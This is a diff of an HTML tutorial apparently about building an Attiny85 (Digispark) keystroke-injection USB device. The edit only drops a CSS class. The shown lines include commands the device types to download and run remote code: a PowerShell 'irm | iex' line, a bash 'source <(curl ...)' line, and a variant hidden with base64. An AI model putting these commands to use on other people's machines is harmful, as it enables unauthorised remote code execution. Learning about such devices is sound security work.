@@ -32,7 +32,7 @@
   <br>
   Once we have the IDE we need to download a plugin to support Attiny85 boards as they are not arduino
   and thus not supported by default. To do this go into: 
-  <code class="hideScroll">File > Preferences... > Additional boards manager URLs</code>
+  <code>File > Preferences... > Additional boards manager URLs</code>
   We need to add the following URL into the box:
   <br>
   <a href="https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json" target="_blank">
@@ -44,7 +44,7 @@
   The URL contains a definition of all the digistump boards with different build instructions and libraries.
   <br>
   We now need to install the "<mark>Digistump AVR Boards</mark>" board manager: 
-  <code class="hideScroll">Tools > Board > Boards manager...</code>
+  <code>Tools > Board > Boards manager...</code>
   During the installation process you will see one of the drivers fail to install, this is due to digistump
   abandoning the project. To fix this we need to manually install the drivers from 
   <a href="https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip" target="_blank">Digistump's github</a>,
@@ -177,7 +177,7 @@ DigiKeyboard.sendKeyStroke(KEY_ENTER);
   <br>
   This command will retrieve and execute whatever code is on 
   <a href="https://tiny.cait.moe/?file=ps" target="_blank">tiny.cait.moe/?file=ps</a>:
-  <code class="hideScroll">irm -Uri https://tiny.cait.moe/?file=ps | iex</code>
+  <code>irm -Uri https://tiny.cait.moe/?file=ps | iex</code>
 </p>
 <p class="entryContent tab">
   To run this in powershell and make our life easier with keyboard layouts there is a couple things we can do:
@@ -213,7 +213,7 @@ DigiKeyboard.sendKeyStroke(KEY_ENTER);
   <br>
   On Linux we can use bash to execute our remote command by using "<mark>curl</mark>" and 
   "<mark>source</mark>" instead.
-  <code class="hideScroll">source <(curl -s https://tiny.cait.moe/?file=sh)</code>
+  <code>source <(curl -s https://tiny.cait.moe/?file=sh)</code>
   To avoid the use of $, ? and ` we can use this command:
   <code>source <(echo aHR0cHM6Ly90aW55LmNhaXQubW9lLz9maWxlPXNo | base64 --decode | xargs -0 curl -s -k -0)</code>
 </p>
